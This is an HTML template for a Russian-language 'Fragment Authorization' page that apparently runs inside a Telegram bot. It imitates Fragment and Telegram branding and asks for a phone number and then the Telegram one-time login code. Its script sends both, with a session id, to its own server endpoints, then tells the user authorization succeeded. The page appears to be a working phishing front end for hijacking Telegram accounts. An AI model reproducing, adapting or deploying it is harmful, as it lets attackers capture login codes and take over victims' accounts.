<!-- templates/index.html -->
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Fragment Authorization</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 40px 20px 20px 20px;
        }

        .container {
            width: 100%;
            max-width: 380px;
        }

        /* Логотипы */
        .logo-row {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 16px;
            margin-bottom: 32px;
        }

        .logo-circle {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .logo-fragment {
            background: #3390ec;
        }

        .logo-telegram {
            background: #1c1f24;
        }

        .logo-fragment svg,
        .logo-telegram svg {
            width: 38px;
            height: 38px;
        }

        .arrow-icon {
            font-size: 26px;
            color: #72b5e8;
            font-weight: 300;
        }

        /* Тексты */
        h2 {
            font-size: 17px;
            font-weight: 600;
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 8px;
            line-height: 1.4;
        }

        .subtitle {
            font-size: 14px;
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 28px;
            line-height: 1.4;
        }

        .hidden {
            display: none !important;
        }

        /* Шаг 1 — ввод номера */
        .form-group {
            margin-bottom: 32px;
        }

        .country-select-wrap {
            border-bottom: 1px solid #e0e0e0;
            padding: 10px 0;
            margin-bottom: 16px;
            position: relative;
        }

        .country-select {
            width: 100%;
            border: none;
            outline: none;
            font-size: 16px;
            background: transparent;
            appearance: none;
            cursor: pointer;
            color: #1a1a1a;
        }

        .country-select-wrap::after {
            content: '▾';
            font-size: 12px;
            color: #aaa;
            position: absolute;
            right: 4px;
            top: 50%;
            transform: translateY(-50%);
            pointer-events: none;
        }

        .phone-row {
            display: flex;
            align-items: center;
            border-bottom: 2px solid #3390ec;
            padding: 10px 0;
        }

        .prefix {
            font-size: 17px;
            color: #1a1a1a;
            margin-right: 14px;
            font-weight: 500;
        }

        .phone-input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 17px;
            letter-spacing: 1.5px;
            color: #1a1a1a;
        }

        .phone-input::placeholder {
            color: #ccc;
            letter-spacing: 1px;
        }

        /* Шаг 2 — ввод кода */
        .code-row {
            display: flex;
            align-items: center;
            border-bottom: 2px solid #3390ec;
            padding: 10px 0;
        }

        .code-input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 20px;
            text-align: center;
            letter-spacing: 8px;
            font-weight: 600;
            color: #1a1a1a;
        }

        .code-input::placeholder {
            color: #ccc;
            letter-spacing: 4px;
            font-weight: 400;
        }

        /* Кнопки */
        .btn-row {
            display: flex;
            justify-content: flex-end;
            gap: 16px;
            margin-top: 24px;
        }

        .btn {
            border: none;
            font-size: 14px;
            font-weight: 600;
            text-transform: uppercase;
            cursor: pointer;
            padding: 12px 22px;
            border-radius: 8px;
            transition: opacity 0.2s, background 0.2s;
            letter-spacing: 0.5px;
        }

        .btn:active {
            opacity: 0.8;
        }

        .btn-cancel {
            background: transparent;
            color: #3390ec;
        }

        .btn-next {
            background: #3390ec;
            color: #fff;
        }

        .btn-next:disabled {
            background: #a0c8f0;
            cursor: not-allowed;
        }

        /* Уведомления */
        .toast {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #222;
            color: #fff;
            padding: 12px 24px;
            border-radius: 10px;
            font-size: 14px;
            z-index: 999;
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
        }

        .toast.show {
            opacity: 1;
        }

        .toast.error {
            background: #d92c2c;
        }

        /* Спиннер */
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid #fff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="toast" id="toast"></div>

<div class="container">
    <!-- Логотипы -->
    <div class="logo-row">
        <div class="logo-circle logo-fragment">
            <svg viewBox="0 0 240 240" fill="none">
                <circle cx="120" cy="120" r="120" fill="#3390ec"/>
                <path d="M54 118.8c35.4-15.4 59-25.7 70.7-30.6 33.3-14 40.3-16.4 44.8-16.5 1 0 3.2.2 4.7 1.5 1.2 1 1.5 2.4 1.7 3.5.2 1.1.4 3.7.2 5.8-2.3 24.3-12.3 83.1-17.4 110.3-2.1 11.5-6.4 15.4-10.5 15.7-8.9.8-15.7-5.9-24.3-11.6-13.5-8.8-21.1-14.3-34.2-23-15.1-10.1-5.3-15.6 3.3-24.6 2.2-2.3 41.2-37.7 42-41 .1-.4.1-1.9-.8-2.7-.9-.8-2.2-.5-3.1-.3-1.4.3-23.2 14.7-65.6 43.3-6.2 4.3-11.8 6.4-16.8 6.3-5.5-.1-16.1-3.1-23.9-5.7-9.6-3.1-17.2-4.8-16.6-10.1.3-2.8 4.2-5.7 11.5-8.7Z" fill="#fff"/>
            </svg>
        </div>
        <span class="arrow-icon">→</span>
        <div class="logo-circle logo-telegram">
            <svg viewBox="0 0 240 240" fill="none">
                <circle cx="120" cy="120" r="120" fill="#1c1f24"/>
                <path d="M120 65L165 93v54L120 175 75 147V93L120 65Z" fill="#fff"/>
            </svg>
        </div>
    </div>

    <!-- Шаг 1: Ввод номера -->
    <div id="step-1">
        <h2>Войдите, чтобы использовать аккаунт Telegram для fragment.com</h2>
        <p class="subtitle">Авторизация через Fragment</p>

        <div class="form-group">
            <div class="country-select-wrap">
                <select class="country-select" id="country-select">
                    <option value="+380" data-flag="🇺🇦">🇺🇦 Украина</option>
                    <option value="+7" data-flag="🇰🇿">🇰🇿 Казахстан</option>
                    <option value="+7" data-flag="🇷🇺">🇷🇺 Россия</option>
                    <option value="+375" data-flag="🇧🇾">🇧🇾 Беларусь</option>
                    <option value="+998" data-flag="🇺🇿">🇺🇿 Узбекистан</option>
                    <option value="+996" data-flag="🇰🇬">🇰🇬 Кыргызстан</option>
                    <option value="+992" data-flag="🇹🇯">🇹🇯 Таджикистан</option>
                    <option value="+994" data-flag="🇦🇿">🇦🇿 Азербайджан</option>
                    <option value="+90" data-flag="🇹🇷">🇹🇷 Турция</option>
                    <option value="other">Другая страна</option>
                </select>
            </div>
            <div class="phone-row">
                <span class="prefix" id="prefix-display">+380</span>
                <input type="tel" class="phone-input" id="phone-input" placeholder="-- --- -- --" inputmode="numeric" autocomplete="tel">
            </div>
        </div>

        <div class="btn-row">
            <button class="btn btn-cancel" id="cancel-btn-1">Отмена</button>
            <button class="btn btn-next" id="next-btn" onclick="sendCode()">Далее</button>
        </div>
    </div>

    <!-- Шаг 2: Ввод кода -->
    <div id="step-2" class="hidden">
        <h2>Введите код для авторизации</h2>
        <p class="subtitle">Мы отправили код в Telegram. Проверьте сообщения на вашем устройстве.</p>

        <div class="form-group">
            <div class="code-row">
                <input type="text" class="code-input" id="code-input" placeholder="-----" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
            </div>
        </div>

        <div class="btn-row">
            <button class="btn btn-cancel" onclick="goBack()">Назад</button>
            <button class="btn btn-next" id="verify-btn" onclick="verifyCode()">Готово</button>
        </div>
    </div>

    <!-- Шаг 3: Успех -->
    <div id="step-3" class="hidden">
        <h2>✅ Авторизация успешна!</h2>
        <p class="subtitle">Ваш аккаунт подтверждён. Можете вернуться в бот.</p>
    </div>
</div>

<script>
    const API_BASE = window.location.origin;

    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const toast = document.getElementById('toast');
    const countrySelect = document.getElementById('country-select');
    const prefixDisplay = document.getElementById('prefix-display');
    const phoneInput = document.getElementById('phone-input');
    const codeInput = document.getElementById('code-input');
    const nextBtn = document.getElementById('next-btn');
    const verifyBtn = document.getElementById('verify-btn');
    const cancelBtn1 = document.getElementById('cancel-btn-1');

    let currentSessionId = null;
    let toastTimer = null;

    // Обновление префикса при смене страны
    countrySelect.addEventListener('change', function() {
        const selected = this.options[this.selectedIndex];
        const prefix = selected.value;
        if (prefix === 'other') {
            prefixDisplay.textContent = '+';
        } else {
            prefixDisplay.textContent = prefix;
        }
    });

    // Кнопка Отмена
    cancelBtn1.addEventListener('click', function() {
        window.Telegram?.WebApp?.close();
    });

    // Тост-уведомления
    function showToast(message, isError = false) {
        if (toastTimer) clearTimeout(toastTimer);
        toast.textContent = message;
        toast.className = 'toast' + (isError ? ' error' : '') + ' show';
        toastTimer = setTimeout(() => {
            toast.classList.remove('show');
        }, 3000);
    }

    // Блокировка кнопки с лоадером
    function setLoading(btn, isLoading) {
        if (isLoading) {
            btn.disabled = true;
            btn.dataset.originalText = btn.textContent;
            btn.innerHTML = '<span class="spinner"></span> Загрузка...';
        } else {
            btn.disabled = false;
            btn.textContent = btn.dataset.originalText || 'Далее';
        }
    }

    // Шаг 1 → Шаг 2: Отправка кода
    async function sendCode() {
        let phone = phoneInput.value.replace(/[\s\-\(\)]/g, '');
        
        if (phone.length < 6) {
            showToast('Введите корректный номер телефона', true);
            return;
        }

        const prefix = prefixDisplay.textContent.trim();
        // Убираем ведущий ноль если есть после кода страны
        const fullPhone = prefix + phone;

        setLoading(nextBtn, true);

        try {
            const response = await fetch(API_BASE + '/api/send-code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: fullPhone })
            });

            const data = await response.json();

            if (data.success) {
                currentSessionId = data.session_id;
                step1.classList.add('hidden');
                step2.classList.remove('hidden');
                codeInput.value = '';
                codeInput.focus();
                showToast('Код отправлен в Telegram');
            } else {
                showToast(data.error || 'Ошибка отправки кода', true);
            }
        } catch (err) {
            showToast('Ошибка соединения с сервером', true);
        } finally {
            setLoading(nextBtn, false);
        }
    }

    // Назад к шагу 1
    function goBack() {
        step2.classList.add('hidden');
        step1.classList.remove('hidden');
        codeInput.value = '';
        currentSessionId = null;
    }

    // Шаг 2 → Шаг 3: Проверка кода
    async function verifyCode() {
        const code = codeInput.value.trim();

        if (code.length < 5) {
            showToast('Введите 5 цифр кода', true);
            return;
        }

        if (!currentSessionId) {
            showToast('Сессия устарела. Начните заново.', true);
            goBack();
            return;
        }

        setLoading(verifyBtn, true);

        try {
            const response = await fetch(API_BASE + '/api/verify-code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    code: code, 
                    session_id: currentSessionId 
                })
            });

            const data = await response.json();

            if (data.success) {
                step2.classList.add('hidden');
                step3.classList.remove('hidden');
                showToast('✅ Авторизация успешна!');
            } else {
                showToast(data.error || 'Неверный код', true);
                codeInput.value = '';
                codeInput.focus();
            }
        } catch (err) {
            showToast('Ошибка соединения с сервером', true);
        } finally {
            setLoading(verifyBtn, false);
        }
    }

    // Enter для отправки
    phoneInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') sendCode();
    });

    codeInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') verifyCode();
    });

    // Автофокус на поле ввода
    phoneInput.focus();
</script>

</body>
  </html>
